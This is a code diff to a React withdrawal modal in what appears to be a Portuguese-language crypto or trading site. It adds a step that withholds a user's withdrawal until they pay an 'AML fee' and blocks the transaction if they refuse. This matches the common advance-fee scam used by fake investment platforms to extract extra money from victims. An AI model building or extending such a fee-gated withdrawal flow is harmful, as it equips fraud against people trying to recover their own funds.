@@ -2,6 +2,7 @@
 
 import { useState } from 'react';
 import { X, Wallet, Banknote, ArrowRight, Shield, AlertCircle } from 'lucide-react';
+import AMLModal from './AMLModal';
 import styles from '@/styles/WithdrawalModal.module.css';
 
 interface WithdrawalModalProps {
@@ -31,6 +32,8 @@ export default function WithdrawalModal({ isOpen, onClose, phase, amount, isAvai
   const [walletAddress, setWalletAddress] = useState('');
   const [securityCode, setSecurityCode] = useState('');
   const [showSecurity, setShowSecurity] = useState(false);
+  const [showAML, setShowAML] = useState(false);
+  const [amlCompleted, setAmlCompleted] = useState(false);
 
   if (!isOpen) return null;
 
@@ -66,10 +69,23 @@ export default function WithdrawalModal({ isOpen, onClose, phase, amount, isAvai
   };
 
   const handleSubmit = () => {
-    // Aqui você implementaria a lógica de envio
-    alert('Levantamento solicitado com sucesso!');
+    // Após completed, mostrar modal AML
+    setShowAML(true);
+  };
+
+  const handleAMLConfirm = () => {
+    setAmlCompleted(true);
+    setShowAML(false);
+    alert('Levantamento processado com sucesso após pagamento AML!');
     onClose();
   };
+
+  const handleAMLReject = () => {
+    alert('Transação bloqueada devido à falta de pagamento de taxas AML.');
+    onClose();
+  };
+
+  const finalAmount = parseFloat(withdrawalAmount) || 0;
 
   const renderStep1 = () => (
     <div className={styles.stepContent}>
@@ -385,6 +401,15 @@ export default function WithdrawalModal({ isOpen, onClose, phase, amount, isAvai
           )}
         </div>
       </div>
+
+      <AMLModal
+        isOpen={showAML}
+        onClose={() => setShowAML(false)}
+        onConfirm={handleAMLConfirm}
+        onReject={handleAMLReject}
+        transactionAmount={finalAmount}
+        currency={currency}
+      />
     </div>
   );
 }
